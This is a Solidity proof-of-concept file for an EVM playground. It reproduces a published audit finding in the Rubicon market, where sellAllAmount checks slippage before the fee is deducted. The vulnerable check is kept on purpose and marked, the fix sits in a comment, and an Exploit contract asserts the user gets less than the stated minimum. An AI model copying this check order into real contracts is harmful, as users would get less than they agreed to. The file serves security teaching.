// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Rubicon — [H-11] RubiconMarket checks slippage incorrectly
    (Code4rena 2023-04-rubicon; #48950)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: sellAllAmount checks fill_amt >= min_fill_amount BEFORE
    calcAmountAfterFee. User supplies min_fill_amount as the post-fee floor;
    the pre-fee check can pass while the actual received amount after fees is
    below that floor.
    Vulnerable order preserved with @> VULN markers. */

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract FeeSink {}

/// @dev Minimal RubiconMarket sellAllAmount with fee applied after slippage check.
contract RubiconMarket {
    struct OfferInfo {
        uint256 pay_amt;
        address pay_gem;
        uint256 buy_amt;
        address buy_gem;
        address owner;
    }

    mapping(uint256 => OfferInfo) public offers;
    uint256 public last_offer_id;
    mapping(address => mapping(address => uint256)) public bestOffer;

    uint256 public constant FEE_BPS = 100; // 1%
    uint256 public constant BPS = 10_000;
    address public feeTo;

    constructor(address _feeTo) {
        feeTo = _feeTo;
    }

    function calcAmountAfterFee(uint256 amt) public pure returns (uint256) {
        return (amt * (BPS - FEE_BPS)) / BPS;
    }

    function offer(uint256 pay_amt, address pay_gem, uint256 buy_amt, address buy_gem) external returns (uint256 id) {
        require(pay_amt > 0 && buy_amt > 0, "dust");
        MockERC20(pay_gem).transferFrom(msg.sender, address(this), pay_amt);
        id = ++last_offer_id;
        offers[id] = OfferInfo(pay_amt, pay_gem, buy_amt, buy_gem, msg.sender);
        bestOffer[pay_gem][buy_gem] = id;
    }

    function getBestOffer(address buy_gem, address pay_gem) public view returns (uint256) {
        return bestOffer[buy_gem][pay_gem];
    }

    function take(uint256 id, uint256 take_amt) internal {
        OfferInfo storage o = offers[id];
        require(take_amt <= o.pay_amt, "too much");
        uint256 payFromTaker = (o.buy_amt * take_amt) / o.pay_amt;
        MockERC20(o.buy_gem).transferFrom(msg.sender, o.owner, payFromTaker);
        MockERC20(o.pay_gem).transfer(msg.sender, take_amt);
        o.pay_amt -= take_amt;
        o.buy_amt -= payFromTaker;
        if (o.pay_amt == 0) {
            if (bestOffer[o.pay_gem][o.buy_gem] == id) bestOffer[o.pay_gem][o.buy_gem] = 0;
            delete offers[id];
        }
    }

    /// @notice Sell pay_amt of pay_gem for buy_gem; min_fill_amount = user's post-fee floor.
    function sellAllAmount(
        address pay_gem,
        uint256 pay_amt,
        address buy_gem,
        uint256 min_fill_amount
    ) external returns (uint256 fill_amt) {
        while (pay_amt > 0) {
            uint256 offerId = getBestOffer(buy_gem, pay_gem);
            require(offerId != 0, "0 offerId");
            OfferInfo memory o = offers[offerId];
            if (pay_amt >= o.buy_amt) {
                fill_amt += o.pay_amt;
                pay_amt -= o.buy_amt;
                take(offerId, o.pay_amt);
            } else {
                uint256 baux = (pay_amt * o.pay_amt) / o.buy_amt;
                fill_amt += baux;
                take(offerId, baux);
                pay_amt = 0;
            }
        }
        // @> VULN: slippage checked on PRE-fee fill_amt; user intends min_fill_amount POST-fee
        require(fill_amt >= min_fill_amount, "min_fill_amount isn't filled"); // @> VULN
        // FIX: fill_amt = calcAmountAfterFee(fill_amt); require(fill_amt >= min_fill_amount, ...);
        fill_amt = calcAmountAfterFee(fill_amt);
        // Skim fee from tokens already transferred to msg.sender in take()
        uint256 pre = (fill_amt * BPS) / (BPS - FEE_BPS);
        uint256 fee = pre - fill_amt;
        if (fee > 0) {
            MockERC20(buy_gem).transferFrom(msg.sender, feeTo, fee);
        }
    }
}

contract Taker {
    RubiconMarket public market;
    MockERC20 public payGem;
    MockERC20 public buyGem;

    constructor(RubiconMarket m, MockERC20 pay, MockERC20 buy) {
        market = m;
        payGem = pay;
        buyGem = buy;
    }

    function sell(uint256 payAmt, uint256 minFill) external returns (uint256) {
        payGem.approve(address(market), payAmt);
        buyGem.approve(address(market), type(uint256).max);
        return market.sellAllAmount(address(payGem), payAmt, address(buyGem), minFill);
    }
}

contract Exploit {
    MockERC20 public payToken; // CREATE 1
    MockERC20 public buyToken; // CREATE 2
    FeeSink public feeSink; // CREATE 3
    RubiconMarket public market; // CREATE 4 — vulnerable
    Taker public taker; // CREATE 5

    uint256 public constant OFFER_PAY = 100e18;
    uint256 public constant OFFER_BUY = 100e18;
    uint256 public minFillWanted;
    uint256 public receivedAfterFee;

    constructor() {
        payToken = new MockERC20("Pay", "PAY");
        buyToken = new MockERC20("Buy", "BUY");
        feeSink = new FeeSink();
        market = new RubiconMarket(address(feeSink));
        taker = new Taker(market, payToken, buyToken);

        buyToken.mint(address(this), OFFER_PAY);
        buyToken.approve(address(market), OFFER_PAY);
        market.offer(OFFER_PAY, address(buyToken), OFFER_BUY, address(payToken));

        payToken.mint(address(taker), OFFER_BUY);
    }

    function run() external {
        // User wants >= 100 buyToken AFTER fees. Pre-fee fill is 100; post-fee is 99.
        minFillWanted = 100e18;

        uint256 balBefore = buyToken.balanceOf(address(taker));
        receivedAfterFee = taker.sell(OFFER_BUY, minFillWanted);
        uint256 balAfter = buyToken.balanceOf(address(taker));

        require(receivedAfterFee == 99e18, "expected 99e18 after 1% fee");
        require(balAfter - balBefore == 99e18, "balance mismatch");
        // Harm: received amount STRICTLY LESS than the min_fill_amount that was accepted
        require(receivedAfterFee < minFillWanted, "got less than min_fill");
        require(buyToken.balanceOf(address(feeSink)) == 1e18, "fee not collected");
    }
}
